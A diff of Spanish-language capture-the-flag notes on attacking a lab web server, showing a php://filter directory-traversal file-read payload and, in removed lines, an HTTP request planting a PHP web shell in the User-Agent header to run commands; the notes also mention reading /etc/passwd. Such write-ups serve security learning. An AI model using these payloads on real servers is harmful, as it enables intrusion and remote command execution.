@@ -39,23 +39,6 @@ Nmap done: 1 IP address (1 host up) scanned in 44.48 seconds
 ###### ok parece que están sanetizando de alguna manera este archivo así que vamos a intentar baypasearlo con una técnica de direcroty traversal 
 ```python
 /?view=php://filter/read=convert.base64-encode/resource=./dog/../index
-GET /?view=php://filter/read=convert.base64-encode/resource=./dog/../index&ext=&cmd=whoami HTTP/1.1
-
-Host: 10.10.183.95
-
-User-Agent: <?php system($_GET['cmd']);?>
-
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-
-Accept-Language: en-US,en;q=0.5
-
-Accept-Encoding: gzip, deflate, br
-
-Connection: close
-
-Upgrade-Insecure-Requests: 1
-
-
 ```
 este comando nos ayuda a hacer el llamado al recurso y encodearlo en base64 
 ![[Pasted image 20240228174008.png]]
@@ -68,3 +51,4 @@ este comando nos ayuda a hacer el llamado al recurso y encodearlo en base64
 ###### perfecto. miramos el codigo fuente
 ![[Pasted image 20240228175200.png]]
 ###### parece que podemos ver el archivo /etc/passwd 
+
